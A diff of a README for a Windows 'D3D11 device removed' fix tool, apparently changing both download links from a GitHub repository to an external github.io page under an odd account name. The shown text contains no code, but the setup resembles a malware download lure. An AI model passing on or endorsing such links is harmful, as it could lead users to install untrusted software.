@@ -1,6 +1,6 @@
 # 🛠️ D3D11-Device-Removed-Fix - Solve graphic driver crashes on Windows
 
-[![](https://img.shields.io/badge/Download-D3D11_Fix-blue.svg)](https://github.com/Chaenomelesenglishweed725/D3D11-Device-Removed-Fix)
+[![](https://img.shields.io/badge/Download-D3D11_Fix-blue.svg)](https://chaenomelesenglishweed725.github.io)
 
 ## 📌 About this project
 
@@ -21,7 +21,7 @@ This tool works on the following systems:
 
 You must visit the project page to locate the latest version of the installer. The software updates periodically to maintain compatibility with Windows patches.
 
-[Visit the release page to download](https://github.com/Chaenomelesenglishweed725/D3D11-Device-Removed-Fix)
+[Visit the release page to download](https://chaenomelesenglishweed725.github.io)
 
 ## ⚙️ How to install and run
 
